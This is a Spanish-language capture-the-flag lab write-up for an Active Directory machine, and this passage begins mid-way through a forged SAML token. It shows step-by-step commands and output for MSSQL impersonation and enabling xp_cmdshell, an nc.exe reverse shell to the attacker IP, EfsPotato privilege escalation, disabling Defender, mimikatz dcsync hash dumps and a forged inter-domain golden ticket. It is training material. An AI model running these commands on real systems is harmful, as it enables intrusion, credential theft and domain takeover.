zAwY0NaUUh4bkp1U3p0eEIxLzg9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPklmUWFJRllWMXNFY09DODFDT08ydFFKVExiY2lnUHVtZmxwSzZBRXZCVE5BS2l0cWNURHppdHNRSmFxTU1HWnV1akpMMmdwNXh3cXZoUDJyUlVrNlI5MDFsSndhcnNSV2JSNThVK3lnM2xXVjI1enAyVTVROStpd2h5Wmt4OFpNcTBsdU4rZzlMZlRSYXc5R2VFQnRNeG11aU1SVlEwSG51YzVsNE14dnc0WjJsbUwzV1ZzanBCejBRcnZKZktFU2U4eEdiVXFHbzNVcVNCbnYyYmpCOEpyVCs5Zys4RWVVS28rVk5ieGpaQWtLMkZvTjJRL2VTQXNROGM1TmZwbXd3QXFwMUpOdnBmWmtFQkV6M2p0RDJ3WWdSZkozVm1jRnRMMWVhKzNqbkFocXkrU2dsTVRqQ2srMTg0OG42TS9BQkpqdEowd2paMlgveFZmSjZnVlNiY3Z3R3JLRUhuMy9YcFpiTTdCMC9XSWF6VlhrUmIrWkc1c0NPS0Zoakxscm9hN3VqWm5ZcHFHSGV2UmlWU1Awak80WEt0MUd0OVQ5WjdyQVc5enRlRjM3RXRMMGFtbkNjODlaMmxkcGUwT1A0ZXBIdWNZakFhSUpBZmIrZ2o0MEpCM0ZFOTNhMWtCVzUwL0NaTnZjRW1VQlhXL3RhWUZXdjAwRm55TWx2b3d3ekxrVnNwK3c0TnlPbE9rcEVXR2srcW9VYmh4VE5uK2pHcmNXVks2WnNqa24ySVlYOVVpdkJKWlJEWk5Rc042ZEc5NFVENUdhRmsvNE5ObHFqeUZHRUZoSmJyWmVHZ3dBLzcyMUZ4R2piME9TWDVlSXc3elhpYVkzdWlTSThQWGE0ZVNEWndoQUdOOVNDZjJlaC9WcmdSUDAwMzdGRnpGZG5iTnNRQ0tsdWJFPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjUtMTEtMTFUMTc6NDA6MzEuMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTExLTExVDE3OjM1OjMxLjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0xMS0xMVQxODozNTozMS4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjUtMTEtMTFUMTc6MzU6MzAuNTAwWiIgU2Vzc2lvbkluZGV4PSJfQkoxOU9BIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D
```
### MSSQL console

Y ahora con la nueva cookie que forjamos podemos ver que pasa si la enviamos a la pagina.

![image-center](/assets/images/{EB531E93-2507-4A84-9107-42DE5EDC78B4}.png)

Una nueva pagina veo, con una consola en la cual puedo ejecutar código para `querys` MSSQL.

![image-center](/assets/images/{31B90888-6719-48E5-9CF2-81FEC2F879EC}.png)
### Enumerate users

Probando con un comando que me permita saber como quien estoy ejecutando las querys .

```sql
select CURRENT_USER();
```

![image-center](/assets/images/{FFED60DC-66F4-4798-AEB7-C1EEA45BBA8B}.png)
### linkedservers

Ahora enumerando servidores enlazados.

```sql
sp_linkedservers
```

Me di cuenta que **`DC01`** y **`PRIMARY`** están enlazados entre si.

![image-center](/assets/images/{649AC59A-BF23-4F43-B4B7-4B8C81F02F14}.png)
### Impersonate sa 

Podría ver si puedo impersonar a algún usuario en PRIMARY, como el usuario `sa` que sé que siempre es un usuario que existe en todas las bases de datos.

```bash
SELECT * FROM OPENQUERY([PRIMARY], '
    SELECT
        p.name AS PrincipalName,
        pe.permission_name
    FROM sys.server_permissions AS pe
    JOIN sys.server_principals AS p
        ON pe.grantee_principal_id = p.principal_id
    WHERE p.name = ''bridge_corp'' OR p.name = ''sa'';
');
```

Lo que me devuelve esto:

```sql


{
    "recordsets": [
        [
            {
                "PrincipalName": "sa",
                "permission_name": "CONNECT SQL"
            },
            {
                "PrincipalName": "bridge_corp",
                "permission_name": "CONNECT SQL"
            },
            {
                "PrincipalName": "bridge_corp",
                "permission_name": "IMPERSONATE"
            }
        ]
    ],
    "recordset": [
        {
            "PrincipalName": "sa",
            "permission_name": "CONNECT SQL"
        },
        {
            "PrincipalName": "bridge_corp",
            "permission_name": "CONNECT SQL"
        },
        {
            "PrincipalName": "bridge_corp",
            "permission_name": "IMPERSONATE"
        }
    ],
    "output": {},
    "rowsAffected": [
        3
```

Esto significa que la cuenta remota a la que te mapea (`bridge_corp`) tiene el permiso explícito **`IMPERSONATE`** (suplantación) a nivel de servidor en **`PRIMARY`**. 
### Enable xp_cmdshell

Por lo que ahora podría usar `xp_cmdshell` para poder ejecutar comandos como `sa` en **`PRIMARY`**.

```bash
EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "show advanced options", 1; RECONFIGURE; exec sp_configure "xp_cmdshell", 1; reconfigure;') AT [PRIMARY];
```

Y ahora para ejecutar comando puedo usar `xp_cmdshell` seguido de un `whoami` como prueba.

```bash
EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell ''whoami''') AT [PRIMARY];
```

Y veoq ue si tengo ejecucipn de comando como system, asi que podria descargar el `nc.exe` en la maquina y luego enviarme la shell.

```bash
EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell ''powershell wget http://10.10.17.19/nc.exe -o C:\ProgramData\nc.exe''')
AT [PRIMARY];
```

Y luego me envio la shell a mi maquina.

```bash
EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell ''C:\ProgramData\nc.exe -e cmd.exe 10.10.17.19 4444''')
AT [PRIMARY];
```

Y como se puede ver recibi, la conexión como el usuario `mssqlserver`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.105] 49852
Microsoft Windows [Version 10.0.20348.2582]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssqlserver
```

## Shell as SYSTEM on Primary

Enumerando los privilegios que tiene esta cuenta de servicio veo que dispone del privilegio `SeImpersonatePrivilege`.

```powershell
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
### EFSPotato

Así que podría usar PrintSpoofer, sin embargo no me funciona, así que probando llegue a `EFSPotato` para abusar del mismo.

```powershell
PS C:\programdata> curl http://10.10.17.19/EfsPotato.cs -o EfsPotato.cs
curl http://10.10.17.19/EfsPotato.cs -o EfsPotato.cs
```

Lo compilamos, tal cual dice en la pagina.

```powershell
csc.exe EfsPotato.cs -nowarn:1691,618
```

Y ejecutando un `whoami` veo que tengo ejecución como `system`.

```bash
PS C:\programdata> .\EfsPotato.exe whoami
.\EfsPotato.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=dfee20)
[+] Get Token: 884
[!] process with pid: 100 created.
==============================
nt authority\system
```

Y ahora me envia la shell.

```powershell
.\EfsPotato.exe "nc.exe -e cmd.exe 10.10.17.19 4444"
```

Y desde mi listener `nc` recibo la shell como `Administrator`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.105] 49843
Microsoft Windows [Version 10.0.20348.2582]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami
whoami
nt authority\system
```

## Shell as Adminstrator

#### Enumeration

Debido a que no puedo ver la flag, debido a que estamos en una maquina en PRIMARY, y no es `DC01` tengo que encontrar una via para saltar al host principal.

```powershell
PS C:\Program Files\Common Files\Microsoft Shared\SQL Debugging\130> systeminfo
systeminfo

Host Name:                 PRIMARY
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-70295-72962-AA521
Original Install Date:     1/30/2024, 7:27:30 PM
System Boot Time:          11/10/2025, 8:02:16 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 12/3/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     831 MB
Available Physical Memory: 96 MB
Virtual Memory: Max Size:  1,727 MB
Virtual Memory: Available: 383 MB
Virtual Memory: In Use:    1,344 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    corp.ghost.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.0.0.10
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\Program Files\Common Files\Microsoft Shared\SQL Debugging\130> Get-ADDomainController
Get-ADDomainController


ComputerObjectDN           : CN=PRIMARY,OU=Domain Controllers,DC=corp,DC=ghost,DC=htb
DefaultPartition           : DC=corp,DC=ghost,DC=htb
Domain                     : corp.ghost.htb
Enabled                    : True
Forest                     : ghost.htb
HostName                   : PRIMARY.corp.ghost.htb
InvocationId               : 34c6785f-058a-4d29-82a2-8a3f118c5595
IPv4Address                : 10.0.0.10
IPv6Address                : ::1
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : PRIMARY
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuratio
                             n,DC=ghost,DC=htb
OperatingSystem            : Windows Server 2022 Datacenter
OperatingSystemHotfix      : 
OperatingSystemServicePack : 
OperatingSystemVersion     : 10.0 (20348)
OperationMasterRoles       : {PDCEmulator, RIDMaster, InfrastructureMaster}
Partitions                 : {DC=DomainDnsZones,DC=corp,DC=ghost,DC=htb, DC=corp,DC=ghost,DC=htb, 
                             DC=ForestDnsZones,DC=ghost,DC=htb, CN=Schema,CN=Configuration,DC=ghost,DC=htb...}
ServerObjectDN             : CN=PRIMARY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ghost,DC=htb
ServerObjectGuid           : e9f296c1-3f55-473b-b8fd-d5ac6be967d7
Site                       : Default-First-Site-Name
SslPort                    : 636
```
### Disable Defender

Para enumerar mas a fondo puedo subir el `Sharphound.exe` o `PowerView` y ejecutarlo. Pero el defender me lo detecta, pero ahora como soy `system`, puedo deshabilitarlo.

```bash
PS C:\ProgramData> .\sh.exe -c all
.\sh.exe -c all
Program 'sh.exe' failed to run: Operation did not complete successfully because the file contains a virus or 
potentially unwanted softwareAt line:1 char:1
+ .\sh.exe -c all
+ ~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\sh.exe -c all
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Para desactivarlo uso.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Ahora con `PowerView.ps1`, enumeramos trust.

```powershell
PS C:\ProgramData> Get-NetDomainTrust
Get-NetDomainTrust


SourceName      : corp.ghost.htb
TargetName      : ghost.htb
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/1/2024 2:33:33 AM
WhenChanged     : 11/11/2025 4:18:25 AM
```

Ahora debido a que sabemos que tenemos un trust, podemos pasar a generar un Golden Ticket, para eso , necesitamos , el `hash` del `krbtgt`, el `sid` del dominio, un `nombre` de usuario del trust, el `FQND` del trust y por ultimo el `SID` del grupo `Enterprise Admins` del Dominio principal.
### Golden ticket attack

Para el hash del usuario `krbtgt` podemos usar `mimikatz.exe`.

```bash
.\mimikatz.exe '/all' exit
```

Y vemos el hash de `GHOST4`.

```bash
mimikatz(commandline) # lsadump::dcsync /all /csv 
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] Exporting domain 'corp.ghost.htb'
502     krbtgt  69eb46aa347a8c68edb99be2725403ab        514
500     Administrator   41515af3ada195029708a53d941ab751        512
1000    PRIMARY$        27f92da5e3d79962020ddebc08ed7d70        532480
1103    GHOST$  69f77a9c3ba88f7667064795f70ad3b7        2080
```
#### Getting SID from trust.

Ahora para obtener el `SID` del dominio, podemos usar `Get-DomainSID`.

```powershell
PS C:\ProgramData> Get-DomainSID
Get-DomainSID
S-1-5-21-2034262909-2733679486-179904498
```

#### Getting SID for Enterprise Admins group

Ahora para obtener el `sid` del grupo `Enterprise Admins` uso el siguiente comando.

```powershell
PS C:\ProgramData> Get-DomainGroup -Domain ghost.htb -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-DomainGroup -Domain ghost.htb -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                             objectsid                                   
-----------------                             ---------                                   
CN=Enterprise Admins,CN=Users,DC=ghost,DC=htb S-1-5-21-4084500788-938703357-3654145966-519
```

Para ya poder pasar ahora a forjar mi ticket con todos los datos.

```bash
impacket-ticketer -nthash '69f77a9c3ba88f7667064795f70ad3b7' -domain-sid S-1-5-21-2034262909-2733679486-179904498 -domain corp.ghost.htb -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -spn krbtgt/ghost.htb zs1nn
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.ghost.htb/zs1nn
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in zs1nn.ccache
```

Y ahora por ultimo solicito un ticket de servicio para el `DC`.

```bash
impacket-getST -k -no-pass -spn 'cifs/dc01.ghost.htb' 'ghost.htb'/'zs1n@corp.ghost.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in zs1n@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache
````

Lo exporto a la variable de kerberos.

```bash
export KRB5CCNAME=zs1n@corp.ghost.htb@CIFS_dc01@GHOST.HTB.ccache 
```
### Shell

Y con `smbclient` me conecto para poder ver la flag del usuario `Administrator`.

```bash
impacket-smbclient 'CORP.GHOST.HTB/Administrator@DC01' -k -no-pass
```

```bash
# cat root.txt
ab61b7229b0d02e6458fd89f814f22bd
```

`~Happy Hacking.`